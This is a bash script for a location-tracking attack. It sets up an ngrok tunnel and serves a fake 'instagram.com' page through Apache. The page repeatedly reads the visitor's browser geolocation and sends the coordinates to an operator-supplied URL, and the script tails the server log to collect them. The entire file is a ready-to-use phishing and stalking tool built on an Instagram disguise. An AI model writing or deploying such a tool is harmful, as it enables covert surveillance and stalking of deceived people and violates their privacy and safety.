#!/bin/bash

#64-bit
#xterm -e ./ngrok_64 http 80 & clear

#32-bit
xterm -e ./ngrok http 80 & clear


echo "            ______________________________________________________
            7      77  _  77  _  77     77  7  77  7  77  _  77  7
            !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |
              7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
              |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
              !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                     "
sleep 5
read -p '           URL: ' varurl
echo "<!DOCTYPE html>
<html>
   <head>
      <title>instagram.com</title>
      <style type=\"text/css\">
         body {
         background-image: url(\"instagram.jpg\");
         background-size: 1200px 900px;
         background-repeat: no-repeat;
         }
      </style>
   </head>
   <body>
      <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>
      <script>
         function httpGet(theUrl) {
             var xmlHttp = new XMLHttpRequest();
             xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
             xmlHttp.send( null );
             return xmlHttp.responseText;
         }

         function autoUpdate() {
           navigator.geolocation.getCurrentPosition(function(position) {
             coords = position.coords.latitude + \",\" + position.coords.longitude;
              url = \""$varurl"/logme/\" + coords;
             httpGet(url);
             console.log('should be working');
             setTimeout(autoUpdate, 2000);
         })
         };
         \$(document).ready(function(){
            autoUpdate();
         });
      </script>
   </body>
</html>" > index.html

mv index.html /var/www/html/index.html
cp instagram.jpg /var/www/html/instagram.jpg
service apache2 start
echo "         ______________________________________________________
         7      77  _  77  _  77     77  7  77  7  77  _  77  7
         !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |
           7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
           |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
           !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                  " > /var/log/apache2/access.log
xterm -e tail -f /var/log/apache2/access.log &
clear
exit
